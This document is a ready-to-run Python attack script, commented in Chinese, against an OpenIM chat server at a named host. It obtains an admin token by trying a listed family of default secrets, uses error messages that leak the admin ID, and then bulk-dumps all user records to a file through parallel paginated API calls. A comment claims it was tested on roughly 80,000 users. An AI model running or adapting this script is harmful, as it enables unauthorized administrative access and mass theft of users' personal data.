#!/usr/bin/env python3
"""OpenIM (OpenCorp 壳) 管理员线: 出 admin token -> 全量 dump 用户
用法: 改 B (host) / SECRET / ADMIN_ID 直接跑。实测 8 万级 164 页 0 失败。
"""
import requests, urllib3, json, uuid, time, concurrent.futures as cf
urllib3.disable_warnings()

B = 'https://bcpou.com'                 # 目标 host
SECRET = '<REDACTED>'                    # 默认值族: openIM123 / openIM123456 / OpenIM123456 / openim123456
ADMIN_ID = 'imAdmin'                    # userID 错报会直给: 'userID is error., adminUserID=[imAdmin]'
OUT = '/root/openim_users_all.jsonl'

s = requests.Session(); s.verify = False
s.headers.update({'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)', 'Content-Type': 'application/json'})

# 1) admin token (headers 必带 operationID + token 占位)
r = s.post(B + '/api/auth/get_admin_token',
           headers={'operationID': str(uuid.uuid4()), 'token': 'x'},
           json={'secret': SECRET, 'userID': ADMIN_ID}, timeout=20)
j = r.json()
tok = (j.get('data') or {}).get('token')
print('admin token:', bool(tok), str(j)[:120])
assert tok, 'secret/adminID 不对, 看报错增量: header must have token / secret invalid / userID is error'
s.headers['token'] = tok

# 2) 分页 dump
SN = 500
def get_page(pn):
    for _ in range(3):
        try:
            r = s.post(B + '/api/user/get_users',
                       headers={'operationID': str(uuid.uuid4())},
                       json={'pagination': {'pageNumber': pn, 'showNumber': SN}}, timeout=25)
            d = r.json().get('data') or {}
            return d.get('users') or [], d.get('total')
        except Exception:
            time.sleep(2)
    return None, None

users0, total = get_page(1)
print('total:', total)
pages = (total + SN - 1) // SN
out = open(OUT, 'w')
n = 0; pn = 1; fails = []
while pn <= pages:
    batch = list(range(pn, min(pn + 4, pages + 1)))
    with cf.ThreadPoolExecutor(4) as ex:
        for p, (us, _t) in ex.map(lambda q: (q, get_page(q)), batch):
            if us is None: fails.append(p); continue
            for u in us:
                out.write(json.dumps(u, ensure_ascii=False) + '\n'); n += 1
    print(f'page {batch[-1]}/{pages} users={n}', flush=True)
    pn += 4
for p in fails:  # 失败页重试
    us, _t = get_page(p)
    if us:
        for u in us: out.write(json.dumps(u, ensure_ascii=False) + '\n'); n += 1
out.close()
print('FINISHED', n, '/', total, 'fail_pages:', fails)
